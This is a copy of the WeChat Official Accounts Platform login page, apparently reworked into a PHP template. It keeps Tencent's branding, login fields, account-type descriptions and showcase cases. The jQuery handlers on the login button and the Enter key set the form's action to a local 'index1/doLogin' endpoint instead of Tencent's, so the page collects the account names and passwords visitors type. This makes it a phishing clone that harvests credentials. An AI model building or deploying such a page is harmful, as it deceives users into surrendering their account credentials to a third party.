<!DOCTYPE html>
<!-- saved from url=(0066)https://mp.weixin.qq.com/cgi-bin/loginpage?t=wxm2-login&lang=zh_CN -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <script type="text/javascript">
          var points=[(window.performance&&window.performance.timing&&window.performance.timing.navigationStart)||+new Date()];
        </script>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <title>微信公众平台</title>
        <link href="https://res.wx.qq.com/mpres/htmledition/images/favicon20f72a.ico" rel="Shortcut Icon">
        <link rel="stylesheet" href="https://res.wx.qq.com/mpres/htmledition/style/page/page_login20f771.css">
        <script type="text/javascript">  
            points[1]=+new Date()-points[0];//css加载完成
        </script> 
        <script type="text/javascript" src="<?=base_url()?>weixin/jquery-1.9.11ec5f7.js"></script>
    </head>
    <body class="zh_CN">
        <div class="head" id="header">
            <div class="head_box">
                <div class="inner wrp">
                    <h1 class="logo">
                        <a href="https://mp.weixin.qq.com/" title="微信公众平台">微信公众平台</a>
                    </h1>
                    <div class="account">
                        <div class="account_meta account_faq">
                            第一次使用公众平台？                            <a href="https://mp.weixin.qq.com/cgi-bin/readtemplate?t=register/step1_tmpl&lang=zh_CN">立即注册</a>
                        </div>
                    </div>
                </div>
            </div>
            <div class="banner">
                <div class="inner wrp">
                    <div class="login_frame">
                        <h3>登录</h3>
                        <div class="login_err_panel" style="display:none;" id="err"> </div>
                        <form class="login_form" id="loginForm" method="post">
                            <div class="login_input_panel" id="js_mainContent">
                                <div class="login_input">
                                    <i class="icon_login un"> </i>
                                    <input type="text" placeholder="邮箱/微信号/QQ号" id="account" name="userid">
                                </div>
                                <div class="login_input">
                                    <i class="icon_login pwd"> </i>
                                    <input type="password" placeholder="密码" id="pwd" name="pwd">
                                </div>
                            </div>
                            <div class="verifycode" style="display:none;" id="verifyDiv">
                                <span class="frm_input_box">
                                    <input class="frm_input" type="text" id="verify" name="verify">
                                </span>
                                <img id="verifyImg" src="">
                                <a href="javascript:;" id="verifyChange">换一张</a>
                            </div>
                            <div class="login_help_panel">
                                <label class="frm_checkbox_label selected" for="rememberCheck">
                                    <i class="icon_checkbox"></i>
                                    <input type="checkbox" class="frm_checkbox" id="rememberCheck">
                                    记住帐号
                                </label>
                                <a class="login_forget_pwd" href="https://mp.weixin.qq.com/cgi-bin/readtemplate?t=home/find_pwd_tmpl&lang=zh_CN">无法登录？</a>
                            </div>
                            <div class="login_btn_panel">
                                <a class="btn_login" title="点击登录" href="javascript:" id="loginBt">登录</a>
                            </div>
                        </form>
                    </div>
                    <script >
					$("body").keydown(function(){
                                 if (event.keyCode == "13") {//keyCode=13是回车键
                                   $('#loginForm').attr('action','<?=site_url()?>/index1/doLogin');
                                    $('#loginForm').submit();
                                }
                    });
							
                            $('#loginBt').click(function() {
                                 $('#loginForm').attr('action','<?=site_url()?>/index1/doLogin');
                                 $('#loginForm').submit();
                          }
                        );
                            
                           
                    </script>
                    
                    <dl class="qrcode_panel">
                        <dt>
                            <img src="<?=base_url()?>weixin/mp_qrcode1e7d69.gif">
                        </dt>
                        <dd>
                            扫描并关注<br>微信公众平台                        </dd>
                    </dl>
                </div>
            </div>
        </div>

        <div id="body" class="body page_login">

            
            <dl class="notices_box">
                <dt>
                    <i class="icon_login speaker"></i>系统公告
                </dt>
                                       
                                <dd>
                    <i>●</i>
                    <a class="notices_title" href="https://mp.weixin.qq.com/cgi-bin/announce?action=getannouncement&key=1412050413&version=13&lang=zh_CN" target="_blank">
                        公众平台新增卡券功能                    </a>
                    <span class="label_new"></span>
                </dd>
                
                                <dd>
                    <i>●</i>
                    <a class="notices_title" href="https://mp.weixin.qq.com/cgi-bin/announce?action=getannouncement&key=1411558964&version=1&lang=zh_CN" target="_blank">
                        自定义菜单针对开发者增加调起扫一扫、发图片、发地理位置等能力                    </a>
                    <span class="label_new"></span>
                </dd>
                
                                  
                <dd class="extra">
                    <a href="https://mp.weixin.qq.com/cgi-bin/announce?action=getannouncementlist&lang=zh_CN" target="_blank">
                        查看更多                        <i class="icon_arrow"></i>
                    </a>
                </dd>
            </dl>

            
            <div class="mp_kind_mod">
                <div class="mp_kind_mod_hd">
                    <h3>帐号分类</h3>
                </div>
                <div class="mp_kind_mod_bd group">
                    <div class="mp_kind_wrp">
                        <dl class="mp_kind">
                            <dt class="name"><span class="icon_mp_kind service"></span>服务号</dt>
                            <dd>给企业和组织提供更强大的业务服务与用户管理能力，帮助企业快速实现全新的公众号服务平台。 </dd>
                        </dl>
                    </div>
                    <div class="mp_kind_wrp">
                        <dl class="mp_kind">
                            <dt class="name"><span class="icon_mp_kind subscribe"></span>订阅号</dt>
                            <dd>为媒体和个人提供一种新的信息传播方式，构建与读者之间更好的沟通与管理模式。</dd>
                        </dl>
                    </div>
					<a href="https://qy.weixin.qq.com/" target="_blank" class="mp_kind_wrp">
                        <dl class="mp_kind">
                            <dt class="name"><span class="icon_mp_kind enterprise"></span>企业号</dt>
                            <dd>为企业或组织提供移动应用入口，帮助企业建立与员工、上下游供应链及企业应用间的连接。</dd>
                        </dl>
                    </a>
                </div>
            </div>

            
            <div class="mp_case_mod">
                <div class="mp_case_mod_hd">
                    <h3 class="mp_case_mod_t">成功案例</h3>
                </div>
                <div class="mp_case_mod_bd js_mpCaseModBd">
                    <ul class="mp_case_list" id="iconList">
                        <li class="mp_case_item jsIconItem" name="zshyh" data-index="0">
                            <span class="icon_wrapper">
                                <i class="icon_mp_case zshyh jsIcon"></i>
                            </span>
                            <h4 class="mp_case_t">招行信用卡</h4>
                        </li>
                        <li class="mp_case_item jsIconItem" name="nfhk" data-index="1">
                            <span class="icon_wrapper">
                                <i class="icon_mp_case nfhk jsIcon"></i>
                            </span>
                            <h4 class="mp_case_t">南方航空</h4>
                        </li>
                        <li class="mp_case_item jsIconItem" name="gdlt" data-index="2">
                            <span class="icon_wrapper">
                                <i class="icon_mp_case gdlt jsIcon"></i>
                            </span>
                            <h4 class="mp_case_t">广东联通</h4>
                        </li>
                        <li class="mp_case_item jsIconItem" name="ysxw" data-index="3">
                            <span class="icon_wrapper">
                                <i class="icon_mp_case ysxw jsIcon on"></i>
                            </span>
                            <h4 class="mp_case_t">央视新闻</h4>
                        </li>
                        <li class="mp_case_item jsIconItem" name="police" data-index="4">
                            <span class="icon_wrapper">
                                <i class="icon_mp_case police jsIcon"></i>
                            </span>
                            <h4 class="mp_case_t">广州公安</h4>
                        </li>
                        <li class="mp_case_item jsIconItem" name="hwzncd" data-index="5" style="margin-right:0px;">
                            <span class="icon_wrapper">
                                <i class="icon_mp_case hwzncd jsIcon"></i>
                            </span>
                            <h4 class="mp_case_t">华为运动健康</h4>
                        </li>
                    </ul>

                    <div class="default_wrapper mp_case_desc group">

                        
                        <div class="mp_case_desc_c jsImg">
                            <img data-src="https://res.wx.qq.com/mpres/htmledition/images/pic/case-detail/zshyh_l1eb8ba.jpg" class="mp_case_desc_img" src="<?=base_url()?>weixin/zshyh_l1eb8ba.jpg">
                            <img data-src="https://res.wx.qq.com/mpres/htmledition/images/pic/case-detail/zshyh_r1eb8ba.jpg" class="mp_case_desc_img extra" src="<?=base_url()?>weixin/zshyh_r1eb8ba.jpg">
                            <p class="mp_case_desc_text">
                                <strong class="case_desc_title">招行信用卡</strong>
                                <span class="case_desc_intro">
                                    服务号 -- 如果你是持卡人，可快捷查询信用卡账单、额度及积分；快速还款、申请账单分期；微信转接人工服务；信用卡消费，微信免费笔笔提醒。如果不是持卡人，可以微信办卡！                                </span>
                            </p>
                            <span class="arrow">
                                <i class="arrow_out"></i>
                                <i class="arrow_in"></i>
                            </span>
                        </div>

                        
                        <div class="mp_case_desc_c jsImg">
                            <img data-src="https://res.wx.qq.com/mpres/htmledition/images/pic/case-detail/nfhk_l1eb8ba.jpg" class="mp_case_desc_img" src="<?=base_url()?>weixin/nfhk_l1eb8ba.jpg">
                            <img data-src="https://res.wx.qq.com/mpres/htmledition/images/pic/case-detail/nfhk_r1eb8ba.jpg" class="mp_case_desc_img extra" src="<?=base_url()?>weixin/nfhk_r1eb8ba.jpg">
                            <p class="mp_case_desc_text">
                                <strong class="case_desc_title">南方航空</strong>
                                <span class="case_desc_intro">
                                    服务号 -- 你可以办理值机手续，挑选座位，查询航班信息，查询目的地城市天气，并为明珠会员提供专业的服务。                                </span>
                            </p>
                            <span class="arrow" style="left:208px;">
                                <i class="arrow_out"></i>
                                <i class="arrow_in"></i>
                            </span>
                        </div>

                        
                        <div class="mp_case_desc_c jsImg">
                            <img data-src="https://res.wx.qq.com/mpres/htmledition/images/pic/case-detail/gdlt_l1eb8ba.jpg" class="mp_case_desc_img" src="<?=base_url()?>weixin/gdlt_l1eb8ba.jpg">
                            <img data-src="https://res.wx.qq.com/mpres/htmledition/images/pic/case-detail/gdlt_r1eb8ba.jpg" class="mp_case_desc_img extra" src="<?=base_url()?>weixin/gdlt_r1eb8ba.jpg">
                            <p class="mp_case_desc_text">
                                <strong class="case_desc_title">广东联通</strong>
                                <span class="case_desc_intro">
                                    服务号 -- 你可以在微信里绑定手机号、积分流量，套餐余量、手机上网流量，微信专属流量查询，客服咨询。                                </span>
                            </p>
                            <span class="arrow" style="left:380px;">
                                <i class="arrow_out"></i>
                                <i class="arrow_in"></i>
                            </span>
                        </div>

                        
                        <div class="mp_case_desc_c jsImg on">
                            <img data-src="https://res.wx.qq.com/mpres/htmledition/images/pic/case-detail/ysxw_l1eb8ba.jpg" class="mp_case_desc_img" src="<?=base_url()?>weixin/ysxw_l1eb8ba.jpg">
                            <img data-src="https://res.wx.qq.com/mpres/htmledition/images/pic/case-detail/ysxw_r1eb8ba.jpg" class="mp_case_desc_img extra" src="<?=base_url()?>weixin/ysxw_r1eb8ba.jpg">
                            <p class="mp_case_desc_text">
                                <strong class="case_desc_title">央视新闻</strong>
                                <span class="case_desc_intro">
                                    订阅号 -- 中央电视台新闻中心官方公众帐号，负责央视新闻频道、综合频道、中文国际频道的资讯及新闻性专栏节目以及英语新闻频道、西班牙语、法语等频道的采制、编播。                                </span>
                            </p>
                            <span class="arrow" style="left:552px">
                                <i class="arrow_out"></i>
                                <i class="arrow_in"></i>
                            </span>
                        </div>

                        
                        <div class="mp_case_desc_c jsImg">
                            <img data-src="https://res.wx.qq.com/mpres/htmledition/images/pic/case-detail/police_l1eb8ba.jpg" class="mp_case_desc_img" src="<?=base_url()?>weixin/police_l1eb8ba.jpg">
                            <img data-src="https://res.wx.qq.com/mpres/htmledition/images/pic/case-detail/police_r1eb8ba.jpg" class="mp_case_desc_img extra" src="<?=base_url()?>weixin/police_r1eb8ba.jpg">
                            <p class="mp_case_desc_text">
                                <strong class="case_desc_title">广州公安</strong>
                                <span class="case_desc_intro">
                                    服务号 -- 广州公安微信平台为您提供最新最快警务资讯、办事指南，您可在此查询交通违法信息、业务办理进度、路况动态资讯，预约出入境和户政业务办理，还可直接办理往来港澳通行证再次签注。                                </span>
                            </p>
                            <span class="arrow" style="left:724px;">
                                <i class="arrow_out"></i>
                                <i class="arrow_in"></i>
                            </span>
                        </div>

                        
                        <div class="mp_case_desc_c jsImg">
                            <img data-src="https://res.wx.qq.com/mpres/htmledition/images/pic/case-detail/hwzncd_l1f89dd.jpg" class="mp_case_desc_img" src="<?=base_url()?>weixin/hwzncd_l1f89dd.jpg">
                            <img data-src="https://res.wx.qq.com/mpres/htmledition/images/pic/case-detail/hwzncd_r1f8b41.jpg" class="mp_case_desc_img extra" src="<?=base_url()?>weixin/hwzncd_r1f8b41.jpg">
                            <p class="mp_case_desc_text">
                                <strong class="case_desc_title">华为运动健康</strong>
                                <span class="case_desc_intro">
                                    服务号—华为荣耀手环 能通话的健康手环！全球首创蓝牙耳机与运动手环的完美结合。荣耀手环不仅可以进行步数统计、卡路里计算、自动睡眠监测、久坐提醒，更能通过微信读取手环运动数据,与好友一起刷运动排行榜；独创的分离式设计，取下耳机部分即可接听电话。想了解华为在可穿戴设备领域的最新进展和产品，欢迎您关注“华为运动健康”！                                </span>
                            </p>
                            <span class="arrow" style="left:896px;">
                                <i class="arrow_out"></i>
                                <i class="arrow_in"></i>
                            </span>
                        </div>

                    </div>
                </div>
            </div>

        </div>

        <div class="foot" id="footer">
	<ul class="links ft">
					<li class="links_item no_extra"><a href="http://www.tencent.com/zh-cn/index.shtml" target="_blank">关于腾讯</a></li>
			<li class="links_item"><a href="https://mp.weixin.qq.com/cgi-bin/readtemplate?t=home/agreement_tmpl&type=info&lang=zh_CN&token=" target="_blank">服务协议</a></li>
			<li class="links_item"><a href="https://mp.weixin.qq.com/cgi-bin/readtemplate?t=business/faq_operation_tmpl&type=info&lang=zh_CN&token=" target="_blank">运营规范</a></li>
			<li class="links_item"><a href="http://kf.qq.com/product/weixinmp.html" target="_blank">客服中心</a></li>
            			<li class="links_item"><a href="http://crm2.qq.com/page/portalpage/wpa.php?uin=40012345&f=1&ty=1&ap=000011:400792:|f:Ggzpt1" target="_blank">在线客服</a></li>
            			<li class="links_item"><a href="mailto:weixinmp@qq.com" target="_blank">联系邮箱</a></li>
			<li class="links_item"><a href="https://mp.weixin.qq.com/cgi-bin/readtemplate?t=home/infringement_tmpl&lang=zh_CN" target="_blank">侵权投诉</a></li>

				<li class="links_item"><p class="copyright">Copyright © 2012-2014 Tencent. All Rights Reserved.</p> </li>
	</ul>
    
	
</div>
<script type="text/javascript">
    //上报测速 --dom加载完成点
    window._points&&(window._points[2]=+new Date());
</script>

        <script type="text/javascript">
          points[2]=+new Date()-points[0];//dom加载完成
        </script>
        <script type="text/javascript" src="<?=base_url()?>weixin/jquery-1.9.11ec5f7.js">
        </script>
        <script type="text/javascript" src="<?=base_url()?>weixin/login_new20550b.js">
        </script>
        <script type="text/javascript" src="<?=base_url()?>weixin/html5Report20a341.js"></script>
        



</body></html>